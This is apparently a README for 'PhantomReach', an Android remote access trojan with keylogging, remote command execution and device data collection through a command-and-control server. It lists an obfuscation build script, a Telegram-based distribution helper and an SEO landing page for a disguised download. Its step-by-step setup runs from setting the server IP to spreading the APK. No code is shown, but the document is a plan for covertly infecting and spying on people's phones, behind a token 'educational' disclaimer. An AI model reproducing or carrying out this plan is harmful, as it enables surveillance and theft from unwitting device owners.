# PhantomReach Android RAT

## Description
A remote administration tool (RAT) for Android, enabling device monitoring and control via a C2 server. Includes keylogging, command execution, and device info collection.

## Detailed Notes
Provided in "ratty" pdf file

## Structure
- `app/` – Android app source (Java)
- `c2_server.py` – Command & control server
- `telegram_distributor.py` – Telegram-based distribution helper
- `build_and_obfuscate.py` – Obfuscation and build script
- `seo_download_page.html` – Landing page for disguised download

## Setup
1. Open project in Android Studio.
2. Update `c2_server.py` with your server IP.
3. Build APK with `build_and_obfuscate.py`.
4. Deploy C2 server on a VPS.
5. Use `telegram_distributor.py` to share the APK.

## Usage
- Run `c2_server.py` to start the listener.
- Installed app connects automatically.
- Commands are sent via the server console.

## Disclaimer
For educational and authorized red‑team testing only. Unauthorized use is illegal.

---

Keep your ghost quiet and your shells encrypted.
